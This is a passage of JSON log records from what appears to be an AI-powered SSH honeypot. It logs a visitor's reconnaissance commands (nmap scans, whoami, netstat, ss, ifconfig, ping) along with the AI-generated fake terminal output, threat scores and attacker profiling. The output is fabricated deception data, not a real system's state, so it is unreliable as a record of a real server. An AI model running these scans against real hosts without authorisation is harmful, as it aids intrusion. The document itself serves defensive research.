        "prediction_confidence": 0.5
    },
    "risk_score": 27,
    "threat_level": "MEDIUM"
}
2026-07-21 11:08:09,145 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: last -n 5",
    "ai_decision": "ubuntu-server login: ubuntu\nLast login: Sun Jun 14 09:15 - 11:22 (02:07)\nubuntu@ubuntu-server:~$ last -n 5\nubuntu   pts/0        192.168.1.10     Mon Jun 15 14:48   still logged in\nubuntu   pts/0        192.168.1.10     Sun Jun 14 09:15 - 11:22  (02:07)\nreboot   system boot  5.15.0-91-generi Sat Jun 13 14:38   still running\nwtmp begins Sat Jun 13 14:38:12 2026",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-21 11:08:16,513 - {
    "session_id": "71dd20b2",
    "query": "netstat",
    "response": "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      221/sshd            \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      510/nginx: master   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      334/mysqld          \ntcp        0      0 192.168.1.3:22          192.168.1.10:54321      ESTABLISHED 221/sshd",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 31,
        "risk_level": "MEDIUM",
        "final_score": 31,
        "threat_level": "MEDIUM",
        "base_score": 31,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 15,
            "unique_commands": 12,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 93
        },
        "engagement": {
            "session_duration": 105,
            "commands_executed": 15,
            "successful_commands": 15,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 93,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 31,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:08:16,513 - {"session_id": "71dd20b2", "command": "netstat", "attack_type": "Network/User Enumeration", "risk_score": 31, "threat_level": "MEDIUM"}
2026-07-21 11:08:16,513 - {
    "session_id": "71dd20b2",
    "command": "netstat",
    "ai_decision": "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      221/sshd            \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      510/nginx: master   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      334/mysqld          \ntcp        0      0 192.168.1.3:22          192.168.1.10:54321      ESTABLISHED 221/sshd",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 15
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.85
    },
    "risk_score": 31,
    "threat_level": "MEDIUM"
}
2026-07-21 11:08:16,513 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: netstat",
    "ai_decision": "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      221/sshd            \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      510/nginx: master   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      334/mysqld          \ntcp        0      0 192.168.1.3:22          192.168.1.10:54321      ESTABLISHED 221/sshd",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Network/User Enumeration",
    "warning": null,
    "error": null
}
2026-07-21 11:08:16,597 - {
    "session_id": "71dd20b2",
    "query": "netstat -antp",
    "response": "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      221/sshd            \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      510/nginx: master   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      334/mysqld          \ntcp        0      0 192.168.1.3:22          192.168.1.10:54321      ESTABLISHED 221/sshd",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 35,
        "risk_level": "MEDIUM",
        "final_score": 35,
        "threat_level": "MEDIUM",
        "base_score": 35,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 16,
            "unique_commands": 13,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 98
        },
        "engagement": {
            "session_duration": 112,
            "commands_executed": 16,
            "successful_commands": 16,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 98,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 35,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:08:16,597 - {"session_id": "71dd20b2", "command": "netstat -antp", "attack_type": "Network/User Enumeration", "risk_score": 35, "threat_level": "MEDIUM"}
2026-07-21 11:08:16,597 - {
    "session_id": "71dd20b2",
    "command": "netstat -antp",
    "ai_decision": "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      221/sshd            \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      510/nginx: master   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      334/mysqld          \ntcp        0      0 192.168.1.3:22          192.168.1.10:54321      ESTABLISHED 221/sshd",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 16
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.85
    },
    "risk_score": 35,
    "threat_level": "MEDIUM"
}
2026-07-21 11:08:16,597 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: netstat -antp",
    "ai_decision": "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      221/sshd            \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      510/nginx: master   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      334/mysqld          \ntcp        0      0 192.168.1.3:22          192.168.1.10:54321      ESTABLISHED 221/sshd",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Network/User Enumeration",
    "warning": null,
    "error": null
}
2026-07-21 11:08:32,852 - {
    "session_id": "71dd20b2",
    "query": "netstat -tulpn",
    "response": "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      221/sshd            \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      510/nginx: master   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      334/mysqld          \ntcp        0      0 192.168.1.3:22          192.168.1.10:54321      ESTABLISHED 221/sshd",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 39,
        "risk_level": "MEDIUM",
        "final_score": 39,
        "threat_level": "MEDIUM",
        "base_score": 39,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 17,
            "unique_commands": 14,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 112,
            "commands_executed": 17,
            "successful_commands": 17,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 39,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:08:32,852 - {"session_id": "71dd20b2", "command": "netstat -tulpn", "attack_type": "Network/User Enumeration", "risk_score": 39, "threat_level": "MEDIUM"}
2026-07-21 11:08:32,852 - {
    "session_id": "71dd20b2",
    "command": "netstat -tulpn",
    "ai_decision": "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      221/sshd            \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      510/nginx: master   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      334/mysqld          \ntcp        0      0 192.168.1.3:22          192.168.1.10:54321      ESTABLISHED 221/sshd",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 17
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.85
    },
    "risk_score": 39,
    "threat_level": "MEDIUM"
}
2026-07-21 11:08:32,852 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: netstat -tulpn",
    "ai_decision": "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      221/sshd            \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      510/nginx: master   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      334/mysqld          \ntcp        0      0 192.168.1.3:22          192.168.1.10:54321      ESTABLISHED 221/sshd",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Network/User Enumeration",
    "warning": null,
    "error": null
}
2026-07-21 11:08:49,376 - {
    "session_id": "71dd20b2",
    "query": "ss -tulpn",
    "response": "Netid  State   Recv-Q Send-Q         Local Address:Port          Peer Address:Port  Process\ntcp    LISTEN  0      128                  0.0.0.0:22                 0.0.0.0:*      1234/ubuntu\ntcp    LISTEN  0      70                 127.0.0.1:3306               0.0.0.0:*      5678/mysqld\ntcp    LISTEN  0      512                  0.0.0.0:80                 0.0.0.0:*      9012/nginx: master",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 43,
        "risk_level": "MEDIUM",
        "final_score": 43,
        "threat_level": "MEDIUM",
        "base_score": 43,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 18,
            "unique_commands": 15,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 129,
            "commands_executed": 18,
            "successful_commands": 18,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 43,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:08:49,376 - {"session_id": "71dd20b2", "command": "ss -tulpn", "attack_type": "Network/User Enumeration", "risk_score": 43, "threat_level": "MEDIUM"}
2026-07-21 11:08:49,376 - {
    "session_id": "71dd20b2",
    "command": "ss -tulpn",
    "ai_decision": "Netid  State   Recv-Q Send-Q         Local Address:Port          Peer Address:Port  Process\ntcp    LISTEN  0      128                  0.0.0.0:22                 0.0.0.0:*      1234/ubuntu\ntcp    LISTEN  0      70                 127.0.0.1:3306               0.0.0.0:*      5678/mysqld\ntcp    LISTEN  0      512                  0.0.0.0:80                 0.0.0.0:*      9012/nginx: master",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 18
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.85
    },
    "risk_score": 43,
    "threat_level": "MEDIUM"
}
2026-07-21 11:08:49,376 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: ss -tulpn",
    "ai_decision": "Netid  State   Recv-Q Send-Q         Local Address:Port          Peer Address:Port  Process\ntcp    LISTEN  0      128                  0.0.0.0:22                 0.0.0.0:*      1234/ubuntu\ntcp    LISTEN  0      70                 127.0.0.1:3306               0.0.0.0:*      5678/mysqld\ntcp    LISTEN  0      512                  0.0.0.0:80                 0.0.0.0:*      9012/nginx: master",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Network/User Enumeration",
    "warning": null,
    "error": null
}
2026-07-21 11:09:17,067 - {
    "session_id": "71dd20b2",
    "query": "ifconfig eth0",
    "response": "flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.3  netmask 255.255.255.0  broadcast 192.168.1.255\n        inet6 fe80::a00:27ff:fe8c:12a4  prefixlen 64  scopeid 0x20<link>\n        ether 08:00:27:8c:12:a4  txqueuelen 1000  (Ethernet)\n        RX packets 1432  bytes 128450 (128.4 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 980  bytes 84320 (84.3 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 12  bytes 960 (960.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 12  bytes 960 (960.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 44,
        "risk_level": "MEDIUM",
        "final_score": 44,
        "threat_level": "MEDIUM",
        "base_score": 44,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 19,
            "unique_commands": 16,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 145,
            "commands_executed": 19,
            "successful_commands": 19,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 44,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:09:17,067 - {"session_id": "71dd20b2", "command": "ifconfig eth0", "attack_type": "Unknown", "risk_score": 44, "threat_level": "MEDIUM"}
2026-07-21 11:09:17,067 - {
    "session_id": "71dd20b2",
    "command": "ifconfig eth0",
    "ai_decision": "flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.3  netmask 255.255.255.0  broadcast 192.168.1.255\n        inet6 fe80::a00:27ff:fe8c:12a4  prefixlen 64  scopeid 0x20<link>\n        ether 08:00:27:8c:12:a4  txqueuelen 1000  (Ethernet)\n        RX packets 1432  bytes 128450 (128.4 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 980  bytes 84320 (84.3 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 12  bytes 960 (960.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 12  bytes 960 (960.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 19
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 44,
    "threat_level": "MEDIUM"
}
2026-07-21 11:09:17,067 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: ifconfig eth0",
    "ai_decision": "flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.3  netmask 255.255.255.0  broadcast 192.168.1.255\n        inet6 fe80::a00:27ff:fe8c:12a4  prefixlen 64  scopeid 0x20<link>\n        ether 08:00:27:8c:12:a4  txqueuelen 1000  (Ethernet)\n        RX packets 1432  bytes 128450 (128.4 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 980  bytes 84320 (84.3 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 12  bytes 960 (960.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 12  bytes 960 (960.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-21 11:09:36,936 - {
    "session_id": "71dd20b2",
    "query": "ip addr show",
    "response": "Warning: Network interface information requested. This may be used for malicious purposes.\n\nlo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\nlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\ninet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\ninet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n\neth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\nlink/ether 08:00:27:8c:12:a4 brd ff:ff:ff:ff:ff:ff\ninet 192.168.1.3/24 brd 192.168.1.255 scope global dynamic eth0\n       valid_lft 86120sec preferred_lft 86120sec\ninet6 fe80::a00:27ff:fe8c:12a4/64 scope link \n       valid_lft forever preferred_lft forever",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 45,
        "risk_level": "HIGH",
        "final_score": 45,
        "threat_level": "HIGH",
        "base_score": 45,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 20,
            "unique_commands": 17,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 173,
            "commands_executed": 20,
            "successful_commands": 20,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 45,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:09:36,936 - {"session_id": "71dd20b2", "command": "ip addr show", "attack_type": "Unknown", "risk_score": 45, "threat_level": "HIGH"}
2026-07-21 11:09:36,936 - {
    "session_id": "71dd20b2",
    "command": "ip addr show",
    "ai_decision": "Warning: Network interface information requested. This may be used for malicious purposes.\n\nlo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\nlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\ninet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\ninet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n\neth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\nlink/ether 08:00:27:8c:12:a4 brd ff:ff:ff:ff:ff:ff\ninet 192.168.1.3/24 brd 192.168.1.255 scope global dynamic eth0\n       valid_lft 86120sec preferred_lft 86120sec\ninet6 fe80::a00:27ff:fe8c:12a4/64 scope link \n       valid_lft forever preferred_lft forever",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 20
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 45,
    "threat_level": "HIGH"
}
2026-07-21 11:09:36,936 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: ip addr show",
    "ai_decision": "Warning: Network interface information requested. This may be used for malicious purposes.\n\nlo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\nlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\ninet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\ninet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n\neth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\nlink/ether 08:00:27:8c:12:a4 brd ff:ff:ff:ff:ff:ff\ninet 192.168.1.3/24 brd 192.168.1.255 scope global dynamic eth0\n       valid_lft 86120sec preferred_lft 86120sec\ninet6 fe80::a00:27ff:fe8c:12a4/64 scope link \n       valid_lft forever preferred_lft forever",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:09:54,192 - {
    "session_id": "71dd20b2",
    "query": "ping -c 4 8.8.8.8",
    "response": "64 bytes from 8.8.8.8: icmp_seq=1 ttl=116 time=12.4 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=116 time=11.8 ms\n64 bytes from 8.8.8.8: icmp_seq=3 ttl=116 time=12.1 ms\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 11.821/12.115/12.432/0.252 ms",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 48,
        "risk_level": "HIGH",
        "final_score": 48,
        "threat_level": "HIGH",
        "base_score": 48,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 21,
            "unique_commands": 18,
            "directories_visited": 1,
            "recon_commands": 6,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 193,
            "commands_executed": 21,
            "successful_commands": 21,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 48,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:09:54,192 - {"session_id": "71dd20b2", "command": "ping -c 4 8.8.8.8", "attack_type": "Reconnaissance", "risk_score": 48, "threat_level": "HIGH"}
2026-07-21 11:09:54,192 - {
    "session_id": "71dd20b2",
    "command": "ping -c 4 8.8.8.8",
    "ai_decision": "64 bytes from 8.8.8.8: icmp_seq=1 ttl=116 time=12.4 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=116 time=11.8 ms\n64 bytes from 8.8.8.8: icmp_seq=3 ttl=116 time=12.1 ms\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 11.821/12.115/12.432/0.252 ms",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 21
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.85
    },
    "risk_score": 48,
    "threat_level": "HIGH"
}
2026-07-21 11:09:54,192 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: ping -c 4 8.8.8.8",
    "ai_decision": "64 bytes from 8.8.8.8: icmp_seq=1 ttl=116 time=12.4 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=116 time=11.8 ms\n64 bytes from 8.8.8.8: icmp_seq=3 ttl=116 time=12.1 ms\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 11.821/12.115/12.432/0.252 ms",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:10:11,197 - {
    "session_id": "71dd20b2",
    "query": "traceroute 8.8.8.8",
